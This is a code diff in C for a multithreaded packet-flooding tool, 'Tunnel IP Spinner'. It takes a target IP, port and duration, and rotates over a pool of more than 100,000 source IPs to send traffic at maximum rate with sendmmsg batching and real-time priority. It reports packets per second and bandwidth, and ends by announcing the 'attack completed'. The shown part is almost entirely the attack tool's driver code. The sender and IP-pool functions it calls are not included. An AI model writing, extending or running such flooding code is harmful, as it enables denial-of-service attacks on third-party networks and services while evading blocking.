+    printf("\n\n╔══════════════════════════════════════════════════════════╗\n");
+    printf("║         🔥 TUNNEL IP SPINNER FINAL STATISTICS 🔥         ║\n");
+    printf("╠══════════════════════════════════════════════════════════╣\n");
+    printf("║ Total Packets:    %20llu packets                         ║\n", total_packets);
+    printf("║ Total Data:       %20.2f GB                              ║\n", total_bytes/1000000000.0);
+    printf("║ Max PPS:          %20llu packets/sec                     ║\n", max_pps);
+    printf("║ Max Bandwidth:    %20.2f Gbps                            ║\n", max_gbps);
+    printf("║ Unique IPs Used:  %20d                                   ║\n", ip_spinner_count);
+    printf("╚══════════════════════════════════════════════════════════╝\n");
     
-    // ====== WAIT FOR THREADS ======
-    for (int i = 0; i < thread_count; i++) {
-        pthread_join(threads[i], NULL);
+    return NULL;
+}
+
+void handle_signal(int sig) { 
+    printf("\n\n[!] STOP SIGNAL RECEIVED...\n");
+    running = 0; 
+}
+
+int main(int argc, char* argv[]) {
+    if(argc < 4) {
+        printf("╔══════════════════════════════════════════════════════════╗\n");
+        printf("║      TUNNEL IP SPINNER - 100,000+ IPs MODE              ║\n");
+        printf("╠══════════════════════════════════════════════════════════╣\n");
+        printf("║ Features:                                                ║\n");
+        printf("║ • 100,000+ unique IPs (Cloudflare + AWS + Private)       ║\n");
+        printf("║ • Continuous traffic - ZERO DELAYS                       ║\n");
+        printf("║ • sendmmsg batching - 100 packets/syscall                ║\n");
+        printf("║ • CPU pinning + Real-time priority                       ║\n");
+        printf("║ • 25 sockets/thread with different IPs                   ║\n");
+        printf("╚══════════════════════════════════════════════════════════╝\n\n");
+        printf("Usage: %s <ip> <port> <time> [threads]\n", argv[0]);
+        printf("  port=0 for random ports\n");
+        printf("  threads = CPU cores (auto = %d)\n\n", get_nprocs());
+        return 1;
     }
     
-    global_running = 0;
+    srand(time(NULL));
+    generate_mega_tunnel_ip_pool();
+    
+    // System optimizations
+    struct rlimit rl;
+    getrlimit(RLIMIT_NOFILE, &rl);
+    rl.rlim_cur = 2000000;
+    rl.rlim_max = 2000000;
+    setrlimit(RLIMIT_NOFILE, &rl);
+    
+    setpriority(PRIO_PROCESS, 0, -20);
+    
+    struct sched_param sp = { .sched_priority = 99 };
+    sched_setscheduler(0, SCHED_FIFO, &sp);
+    
+    char* ip = argv[1];
+    int port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
+    int threads = get_nprocs();
+    if(argc >= 5) threads = atoi(argv[4]);
+    if(threads > 64) threads = 64;
+    
+    printf("╔══════════════════════════════════════════════════════════╗\n");
+    printf("║        🚀 TUNNEL IP SPINNER ACTIVE - %d IPs 🚀          ║\n", ip_spinner_count);
+    printf("╠══════════════════════════════════════════════════════════╣\n");
+    printf("║ Target:        %s:%d                                      ║\n", ip, port);
+    printf("║ Duration:      %d seconds                                 ║\n", duration);
+    printf("║ Threads:       %d                                         ║\n", threads);
+    printf("║ Sockets:       %d per thread (%d total)                  ║\n", SOCKETS_PER_THREAD, threads * SOCKETS_PER_THREAD);
+    printf("║ Unique IPs:    %d per rotation                           ║\n", ip_spinner_count);
+    printf("╚══════════════════════════════════════════════════════════╝\n\n");
+    
+    signal(SIGINT, handle_signal);
+    
+    pthread_t stats_thread;
+    pthread_create(&stats_thread, NULL, ultra_stats_display, &duration);
+    
+    pthread_t* thread_pool = malloc(sizeof(pthread_t) * threads);
+    attack_params* params = malloc(sizeof(attack_params) * threads);
+    
+    printf("🔥 SPINNING %d IPS ACROSS %d THREADS...\n\n", ip_spinner_count, threads);
+    
+    for(int i = 0; i < threads; i++) {
+        strcpy(params[i].ip, ip);
+        params[i].port = port;
+        params[i].duration = duration;
+        params[i].thread_id = i;
+        
+        pthread_create(&thread_pool[i], NULL, ultra_aggressive_sender, &params[i]);
+    }
+    
+    for(int i = 0; i < threads; i++) {
+        pthread_join(thread_pool[i], NULL);
+    }
+    
+    running = 0;
     pthread_join(stats_thread, NULL);
     
-    // ====== FINAL STATS ======
-    printf("\n\n\033[36m");
-    printf("╔══════════════════════════════════════════════════════════╗\n");
-    printf("║                    FINAL STATISTICS                     ║\n");
-    printf("╚══════════════════════════════════════════════════════════╝\n");
-    printf("\033[0m\n");
-    printf("\033[32m[+] Total Packets Sent: \033[0m%llu\n", total_packets);
-    printf("\033[32m[+] Total Data Sent: \033[0m%.2f MB\n", (float)total_bytes / (1024*1024));
-    printf("\033[32m[+] Average Rate: \033[0m%.2f pps\n", 
-           (float)total_packets / duration);
-    printf("\033[32m[+] Duration: \033[0m%d seconds\n", duration);
-    printf("\033[32m[+] Threads Used: \033[0m%d\n", thread_count);
-    printf("\033[32m[+] Burst Size: \033[0m%d\n", burst_size);
-    printf("\n\033[33m[✓] Test completed successfully!\033[0m\n\n");
+    free(thread_pool);
+    free(params);
+    free(ip_spinner_pool);
     
+    printf("\n✓ Tunnel IP Spinner attack completed! Used %d unique IPs\n", ip_spinner_count);
     return 0;
 }
